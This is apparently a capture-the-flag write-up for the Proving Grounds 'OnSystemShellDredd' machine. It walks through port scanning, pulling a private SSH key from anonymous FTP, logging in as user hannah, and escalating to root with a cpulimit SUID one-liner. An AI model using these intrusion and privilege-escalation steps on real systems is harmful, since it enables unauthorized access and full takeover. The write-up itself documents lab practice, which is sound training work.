---
layout: default
title: OnSystemShellDredd
parent: Proving Grounds Play
nav_order: 4
---

## Discovered Ports for Enumeration

- _21_ - FTP
- _61000_ - SSH

## Users and Credentials

- _Users_: hannah
- _Credentials_:

# Scanning

---

```bash
sudo nmap -Pn -p- -sC -sV -T4 -vv --open 192.168.199.130
```

# Enumeration

---

## 21 - FTP

Anonymous login allowed.

Discovered hidden directory named _.hannah_

Discovered private RSA key.

![rsa_key](../../../assets/images/ctfs/proving_grounds/onsystemshelldredd/rsa_key.png)

Download the private key and save locally to _id_rsa_ file.

# Exploitation

---

Use the downloaded RSA private key to authenticate to port 61000 SSH as user _hannah_

![ssh](../../../assets/images/ctfs/proving_grounds/onsystemshelldredd/ssh.png)

# Post-Exploitation

---

## Check SUID/GUID Permissions

```bash
find / -perm -u=s -type f 2>/dev/null
```

![suid](../../../assets/images/ctfs/proving_grounds/onsystemshelldredd/suid.png)

![gtfobins](../../../assets/images/ctfs/proving_grounds/onsystemshelldredd/gtfobins.png)

## Exploit Cpulimit SUID to get root

```bash
cpulimit -l 100 -f -- /bin/sh -p
```

![root](../../../assets/images/ctfs/proving_grounds/onsystemshelldredd/root.png)
